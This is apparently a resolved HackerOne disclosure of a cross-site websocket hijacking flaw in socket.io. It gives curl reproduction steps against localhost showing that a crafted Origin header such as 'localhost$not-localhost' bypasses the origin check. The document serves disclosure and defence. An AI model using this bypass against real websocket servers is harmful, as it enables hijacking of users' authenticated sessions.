---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/cross-site-request-forgery-csrf
  - env/web
  - stack/node
substate: "resolved"
weakness: "Cross-Site Request Forgery (CSRF)"
enriched: true
date: 2021-01-31
submitted: 2020-07-22T12:04:27.685Z
bounty_usd: null
votes: 27
cve: []
program: "[[programs/nodejs-ecosystem|Node.js third-party modules]]"
reporter: "sh1yo"
source: "https://hackerone.com/reports/931197"
title: "[socket.io] Cross-Site Websocket Hijacking "
---
# [socket.io] Cross-Site Websocket Hijacking 

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 27 | **Program:** Node.js third-party modules | **Disclosed:** 2021-01-31

- Report: [https://hackerone.com/reports/931197](https://hackerone.com/reports/931197)
- CWE: Cross-Site Request Forgery (CSRF)
- Submitted: 2020-07-22T12:04:27.685Z

## Report summary

-

## Timeline

- **Report Filed**
- **2020-08-03** @sh1yo: I've been notified that sometimes it is not convenient for you to use BurpSuite, so here are reproduction steps with curl:

-  Send the following curl request:

`curl -v "http://localhost:80/socket.io/?EIO=3&transport=websocket" -H "Sec-WebSocket-Version: 13"  -H "Sec-WebSocket-Key: 7fhAFB4aUGBFRJ0p0dDfTg==" -H "Upgrade: websocket" -H "Sec-WebSocket-Extensions: permessage-deflate" -H "Host: localhost" -H "Connection: keep-alive, Upgrade" -H "Origin: http://localhost"`

You will see curl output with `HTTP/1.1 101 Switching Protocols` in the response.

- Now change the origin and send yet one request:

`curl -v "http://localhost:80/socket.io/?EIO=3&transport=websocket" -H "Sec-WebSocket-Version: 13"  -H "Sec-WebSocket-Key: 7fhAFB4aUGBFRJ0p0dDfTg==" -H "Upgrade: websocket" -H "Sec-WebSocket-Extensions: permessage-deflate" -H "Host: localhost" -H "Connection: keep-alive, Upgrade" -H "Origin: http://not-localhost"`

You will see that the server rejected the request with `HTTP/1.1 400 Bad Request`.

- Now change the origin header to something like `localhost$not-localhost`:

`curl -v "http://localhost:80/socket.io/?EIO=3&transport=websocket" -H "Sec-WebSocket-Version: 13" -H "Sec-WebSocket-Key: 7fhAFB4aUGBFRJ0p0dDfTg==" -H "Upgrade: websocket" -H "Sec-WebSocket-Extensions: permessage-deflate" -H "Host: localhost" -H "Connection: keep-alive, Upgrade" -H "Origin: http://localhost\$not-localhost"`

You again will see `HTTP/1.1 101 Switching Protocols` despite the origin is not localhost.
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
